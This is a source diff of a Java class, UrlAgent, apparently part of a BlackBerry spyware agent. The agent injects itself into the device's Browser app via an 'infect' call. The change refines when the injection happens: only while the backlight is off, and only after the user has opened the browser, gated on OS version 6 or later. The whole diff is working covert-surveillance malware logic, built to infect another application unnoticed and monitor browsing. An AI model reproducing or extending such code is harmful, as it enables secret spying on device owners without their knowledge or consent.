@@ -15,6 +15,7 @@ import java.util.Vector;
 import net.rim.device.api.system.Backlight;
 import blackberry.AgentManager;
 import blackberry.AppListener;
+import blackberry.Device;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -38,6 +39,8 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     String appName = "Browser";
 
     AppInjector appInjector;
+
+    private boolean seen = true;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
@@ -53,6 +56,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         //#ifdef URL_FORCED
         enable(true);
         //#endif
+
+        if (Device.getInstance().atLeast(6, 0)) {
+            seen = false;
+        }
     }
 
     /**
@@ -87,13 +94,16 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.error("actualStart: " + ex);
             //#endif
         }
-        
-        if (!Backlight.isEnabled() && !appInjector.isInfected()) {
+
+        if (!Backlight.isEnabled() && !appInjector.isInfected() && seen) {
             //#ifdef DEBUG
             debug.info("injecting");
             //#endif
 
             appInjector.infect();
+            if (Device.getInstance().atLeast(6, 0)) {
+                seen = false;
+            }
         }
 
     }
@@ -121,6 +131,12 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
 
             appInjector.callMenuInContext();
+        } else {
+            //#ifdef DEBUG
+            debug.trace("actualRun: infected=" + appInjector.isInfected()
+                    + " backlight=" + Backlight.isEnabled() + " foreground="
+                    + isAppForeground);
+            //#endif
         }
     }
 
@@ -145,6 +161,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             debug.trace("onApplicationChange: foreground");
             //#endif
             isAppForeground = true;
+            seen = true;
         } else {
             //#ifdef DEBUG
             debug.trace("onApplicationChange: not foreground");
@@ -154,12 +171,16 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     }
 
     public void onBacklightChange(boolean on) {
-        if (!on && !appInjector.isInfected()) {
+        if (!on && !appInjector.isInfected() && seen) {
             //#ifdef DEBUG
             debug.info("onBacklightChange, injecting");
             //#endif
 
             appInjector.infect();
+            
+            if (Device.getInstance().atLeast(6, 0)) {
+                seen = false;
+            }
         }
     }
 
@@ -188,10 +209,10 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     public static UrlAgent getInstance() {
         return (UrlAgent) AgentManager.getInstance().getItem(Agent.AGENT_URL);
     }
-    
+
     //#ifdef DEBUG
-    public void disinfect(){
-        if(appInjector!=null){
+    public void disinfect() {
+        if (appInjector != null) {
             appInjector.disinfect();
         }
     }
